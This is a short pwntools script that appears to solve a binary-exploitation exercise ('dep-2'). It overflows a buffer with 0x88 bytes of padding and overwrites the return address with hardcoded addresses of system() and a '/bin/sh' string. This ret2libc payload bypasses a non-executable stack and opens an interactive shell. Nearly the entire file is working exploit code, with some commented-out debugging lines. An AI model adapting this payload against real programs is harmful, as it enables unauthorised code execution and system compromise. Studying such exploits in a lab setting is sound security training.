#! /usr/bin/env python

from pwn import *

p = process ('./dep-2')

print (p.recv())

#gdb.attach(p)

context.terminal = ['tmux', 'splitw', '-h']

#e = ELF ('./dep-2')
system = 0xf7e39da0
print(hex(system))

bin_sh = 0xf7f5aa0b
print(hex(bin_sh))


buffer = "A" * 0x88 + "AAAA" + p32(system) + "GGGG" + p32(bin_sh)

#p.sendline(buffer)
#p.wait()

#c = Core('./core')

#buffer_addr = c.stack.find(buffer)

#print(hex(buffer_addr))

#buffer = p32(some_function)
#while (len(buffer)) < 0x100:
#    buffer += p32(some_function)


p.sendline(buffer)

p.interactive()
